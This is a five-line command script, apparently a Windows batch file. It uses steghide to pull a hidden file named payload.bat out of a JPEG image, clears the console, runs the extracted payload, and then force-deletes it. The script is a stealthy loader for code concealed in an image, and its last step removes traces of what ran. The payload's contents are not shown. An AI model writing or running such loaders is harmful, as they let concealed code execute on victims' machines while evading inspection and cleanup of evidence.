steghide --extract --stegofile profile_steg_Payload.jpg -xf payload.bat
cls
echo \n\n
payload.bat
del /f payload.bat